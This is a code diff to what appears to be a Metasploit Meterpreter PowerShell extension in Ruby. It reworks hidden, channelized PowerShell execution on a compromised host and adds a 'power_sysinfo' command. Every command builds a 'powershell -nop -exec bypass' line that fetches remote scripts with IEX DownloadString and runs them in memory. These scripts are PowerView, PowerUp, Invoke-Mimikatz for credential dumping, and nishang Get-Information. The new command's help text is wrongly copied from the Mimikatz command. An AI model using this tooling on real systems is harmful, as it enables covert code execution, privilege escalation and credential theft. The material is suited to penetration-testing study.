@@ -22,10 +22,11 @@ class Console::CommandDispatcher::Priv::PowerShell
   #
   def commands
     {
-      "power_shell" => "Execute a powershell command.",
-      "power_view"  => "Download and execute Veil's PowerView Framework",
-      "power_up"    => "Download and execute the PowerUp Framework",
-      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell"
+      "power_shell"   => "Execute a powershell command.",
+      "power_view"    => "Download and execute Veil's PowerView Framework",
+      "power_up"      => "Download and execute the PowerUp Framework",
+      "power_katz"    => "Invoke-Mimikatz into memory using PowerShell",
+      "power_sysinfo" => "Test Command"
     }
   end
 
@@ -203,45 +204,67 @@ Ref: https://github.com/HarmJ0y/PowerUp
         yield if block_given?
       end
     end  
-    output   = "#{rand(1000000)}"
     ps_cmd   = args.join(" ")
-    tmp_dir  = client.fs.file.expand_path("%temp%")
-    tmp_file = "#{tmp_dir}\\#{output}"
+    return output_file, c_time, ps_cmd
+  end
 
-    return output_file, c_time, ps_cmd, tmp_file
+  def ps_shell_exec(command, c_time)
+    client.shell_init    
+    client.shell_write(command + "\n")
+    read_count = c_time / 2
+    until read_count == 0 do
+      buf = client.shell_read
+      if buf.nil?
+        sleep 0.01
+        read_count -= 1
+      else
+        print(buf)
+      end
+    end
+    client.shell_close
+    return true
+  end
+
+  def execute_pshell_command(command, time_out = 120)
+    running_pids, open_channels = [], []
+    client.response_timeout = time_out
+    cmd_out = client.sys.process.execute(command, nil, {'Hidden' => true, 'Channelized' => true})
+    running_pids << cmd_out.pid
+    open_channels << cmd_out
+    return [cmd_out, running_pids, open_channels]
   end
 
   #
   # HELPER: Executes powershell on the host.
   #
-  def ps_exec(command, tmp_file, c_time, output_file)
-    encoding_options = {
-      :invalid           => :replace,  # Replace invalid byte sequences
-      :undef             => :replace,  # Replace anything not defined in ASCII
-      :replace           => '',        # Use a blank for those replacements
-      :universal_newline => false       # Always break lines with \n
-    }
+  def ps_exec(command, c_time, output_file)
     print_status("Sending command to client...")
-    client.sys.process.execute(command, nil, {'Hidden' => 'true', 'Channelized' => true})
-    sleep(c_time)
-    log_file = client.fs.file.new(tmp_file, "rb")
-    begin
-      while ((data = log_file.read) != nil)
-        data.strip!
-        print_line(data.encode(::Encoding.find('ASCII'), encoding_options))
+    print_status("Command Start: #{Time.now.to_s}")
+    cmd_out, running_pids, open_channels = *execute_pshell_command(command)
+    output_thr = ::Thread.new do
+      while(line = cmd_out.channel.read())
+        print(line)
       end
-    rescue EOFError
-    ensure
-      log_file.close
     end
-    client.sys.process.execute("cmd /c del #{tmp_file}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    c_time.times do
+      sleep 1
+    end
+    ::Thread.kill(output_thr)
+    running_pids.each() do |pid|
+      client.sys.process.kill(pid)
+    end
+    open_channels.each() do |chan|
+      chan.channel.close()
+    end
+    print_line("")
+    print_status("Command End: #{Time.now.to_s}")
   end
 
   #
   # Direct PowerShell Commands
   #
   def cmd_power_shell(*args)
-    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+    output_file, c_time, ps_cmd = ps_setup(args) do
       print_line(POWER_SHELL_USAGE)
       print_line("-" * 60)
       print("Usage: power_shell [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
@@ -249,8 +272,8 @@ Ref: https://github.com/HarmJ0y/PowerUp
             @@command_opts.usage)
       return true
     end
-    command = "powershell -nop -exec bypass -c #{ps_cmd} >> #{tmp_file}"
-    ps_exec(command, tmp_file, c_time, output_file)
+    command = "powershell -nop -exec bypass -c #{ps_cmd}"
+    ps_exec(command, c_time, output_file)
     return true
   end
 
@@ -259,7 +282,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
   #
   def cmd_power_view(*args)
     link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
-    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+    output_file, c_time, ps_cmd = ps_setup(args) do
       print_line(POWER_VIEW_USAGE)
       print_line("-" * 60)
       print("Usage: power_view [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
@@ -267,8 +290,8 @@ Ref: https://github.com/HarmJ0y/PowerUp
             @@command_opts.usage)
       return true
     end
-    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
-    ps_exec(command, tmp_file, c_time, output_file)
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\""
+    ps_exec(command, c_time, output_file)
     return true    
   end
 
@@ -277,7 +300,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
   #
   def cmd_power_up(*args)
     link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'
-    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+    output_file, c_time, ps_cmd = ps_setup(args) do
       print_line(POWER_UP_USAGE)
       print_line("-" * 60)
       print("Usage: power_up [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
@@ -285,8 +308,8 @@ Ref: https://github.com/HarmJ0y/PowerUp
             @@command_opts.usage)
       return true
     end
-    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> #{tmp_file}"
-    ps_exec(command, tmp_file, c_time, output_file)
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\""
+    ps_exec(command, c_time, output_file)
     return true        
   end
 
@@ -295,7 +318,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
   #
   def cmd_power_katz(*args)
     link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'
-    output_file, c_time, ps_cmd, tmp_file = ps_setup(args) do
+    output_file, c_time, ps_cmd = ps_setup(args) do
       print_line(POWER_KATZ_USAGE)
       print_line("-" * 60)
       print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
@@ -303,8 +326,23 @@ Ref: https://github.com/HarmJ0y/PowerUp
             @@command_opts.usage)
       return true
     end
-    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> #{tmp_file}"
-    ps_exec(command, tmp_file, c_time, output_file)
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\""
+    ps_exec(command, c_time, output_file)
+    return true            
+  end
+
+  def cmd_power_sysinfo(*args)
+    link = 'https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1'
+    output_file, c_time, ps_cmd = ps_setup(args) do
+      print_line(POWER_KATZ_USAGE)
+      print_line("-" * 60)
+      print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
+            "Downloads and executes Mimikatz in memory through Powershell.\n" +
+            @@command_opts.usage)
+      return true
+    end
+    command = "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\""
+    ps_exec(command, c_time, output_file)
     return true            
   end
 
